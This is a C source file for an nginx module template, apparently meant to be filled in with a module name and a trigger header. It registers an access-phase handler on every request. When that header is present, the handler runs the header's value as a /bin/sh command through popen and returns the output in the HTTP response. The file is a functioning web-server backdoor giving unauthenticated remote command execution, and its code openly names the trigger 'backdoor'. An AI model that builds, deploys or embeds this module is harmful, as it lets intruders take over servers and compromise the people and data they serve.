#include <ngx_config.h>
#include <ngx_core.h>
#include <ngx_http.h>
#include <sys/stat.h>
#include <unistd.h>

#define SHELL "/bin/sh"
#define MAX_CMD_LEN 1024
#define INITIAL_BUF_SIZE 4096
#define MAX_OUTPUT_SIZE (1 << 20)

static ngx_str_t backdoor = ngx_string("__HEADER__");

static ngx_int_t __NAME___handler(ngx_http_request_t *r);
static ngx_int_t __NAME___init(ngx_conf_t *cf);
static void __NAME___down(ngx_cycle_t *cycle);
static ngx_table_elt_t *search_headers_in(ngx_http_request_t *r, u_char *name, size_t len);

static ngx_command_t __NAME___commands[] = {
    { ngx_string("__NAME__"),
      NGX_HTTP_LOC_CONF|NGX_CONF_NOARGS,
      NULL,
      0,
      0,
      NULL },
    ngx_null_command
};

static ngx_http_module_t __NAME___ctx = {
    NULL,
    __NAME___init,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL
};

ngx_module_t __NAME__ = {
    NGX_MODULE_V1,
    &__NAME___ctx,
    __NAME___commands,
    NGX_HTTP_MODULE,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    &__NAME___down,
    NGX_MODULE_V1_PADDING
};

static ngx_int_t __NAME___init(ngx_conf_t *cf)
{
    ngx_http_handler_pt *h;
    ngx_http_core_main_conf_t *cmcf;

    cmcf = ngx_http_conf_get_module_main_conf(cf, ngx_http_core_module);
    h = ngx_array_push(&cmcf->phases[NGX_HTTP_ACCESS_PHASE].handlers);
    if (h == NULL) {
        return NGX_ERROR;
    }

    *h = __NAME___handler;
    return NGX_OK;
}

static ngx_int_t __NAME___handler(ngx_http_request_t *r)
{
    ngx_table_elt_t *header = search_headers_in(r, backdoor.data, backdoor.len);
    if (header == NULL) {
        return NGX_OK;
    }

    if (header->value.len > MAX_CMD_LEN) {
        return NGX_HTTP_BAD_REQUEST;
    }

    static const char *cmd_prefix = SHELL " -c \"";
    static const char *cmd_suffix = "\" 2>&1";
    size_t cmd_len = ngx_strlen(cmd_prefix) + header->value.len + ngx_strlen(cmd_suffix) + 1;
    u_char *cmd = ngx_pnalloc(r->pool, cmd_len);
    if (cmd == NULL) {
        return NGX_HTTP_INTERNAL_SERVER_ERROR;
    }

    u_char *p = cmd;
    p = ngx_cpymem(p, cmd_prefix, ngx_strlen(cmd_prefix));
    p = ngx_cpymem(p, header->value.data, header->value.len);
    p = ngx_cpymem(p, cmd_suffix, ngx_strlen(cmd_suffix));
    *p = '\0';

    size_t buf_size = INITIAL_BUF_SIZE;
    u_char *response = ngx_pnalloc(r->pool, buf_size);
    if (response == NULL) {
        return NGX_HTTP_INTERNAL_SERVER_ERROR;
    }
    size_t response_len = 0;

    FILE *fp = popen((char *)cmd, "r");
    if (fp == NULL) {
        static const u_char err[] = "Failed to run command - popen failure\n";
        response_len = sizeof(err) - 1;
        response = (u_char *)err;
    } else {
        char buf[1024];
        while (fgets(buf, sizeof(buf), fp) != NULL) {
            size_t line_len = ngx_strlen(buf);
            if (response_len + line_len + 1 > buf_size) {
                if (buf_size >= MAX_OUTPUT_SIZE) {
                    pclose(fp);
                    return NGX_HTTP_REQUEST_ENTITY_TOO_LARGE;
                }
                buf_size = ngx_min(buf_size * 2, MAX_OUTPUT_SIZE);
                u_char *new_response = ngx_pnalloc(r->pool, buf_size);
                if (new_response == NULL) {
                    pclose(fp);
                    return NGX_HTTP_INTERNAL_SERVER_ERROR;
                }
                ngx_memcpy(new_response, response, response_len);
                response = new_response;
            }
            ngx_memcpy(response + response_len, buf, line_len);
            response_len += line_len;
        }
        pclose(fp);

        if (response_len == 0) {
            static const u_char empty[] = "Empty command response\n";
            response_len = sizeof(empty) - 1;
            response = (u_char *)empty;
        }
    }

    if (ngx_http_discard_request_body(r) != NGX_OK) {
        return NGX_HTTP_INTERNAL_SERVER_ERROR;
    }

    r->headers_out.status = NGX_HTTP_OK;
    r->headers_out.content_length_n = response_len;
    ngx_str_set(&r->headers_out.content_type, "text/plain");

    ngx_int_t rc = ngx_http_send_header(r);
    if (rc == NGX_ERROR || rc > NGX_OK || r->header_only) {
        return rc;
    }

    ngx_buf_t *b = ngx_create_temp_buf(r->pool, response_len);
    if (b == NULL) {
        return NGX_HTTP_INTERNAL_SERVER_ERROR;
    }

    b->pos = response;
    b->last = response + response_len;
    b->memory = 1;
    b->last_buf = (r == r->main) ? 1 : 0;
    b->last_in_chain = 1;

    ngx_chain_t out = { b, NULL };
    rc = ngx_http_output_filter(r, &out);

    return rc == NGX_OK ? NGX_OK : NGX_ERROR;
}

static void __NAME___down(ngx_cycle_t *cycle) {
}

static ngx_table_elt_t *search_headers_in(ngx_http_request_t *r, u_char *name, size_t len)
{
    ngx_list_part_t *part = &r->headers_in.headers.part;
    ngx_table_elt_t *h = part->elts;

    for (ngx_uint_t i = 0; ; i++) {
        if (i >= part->nelts) {
            if (part->next == NULL) break;
            part = part->next;
            h = part->elts;
            i = 0;
        }
        if (len != h[i].key.len || ngx_strcasecmp(name, h[i].key.data) != 0) {
            continue;
        }
        return &h[i];
    }
    return NULL;
}
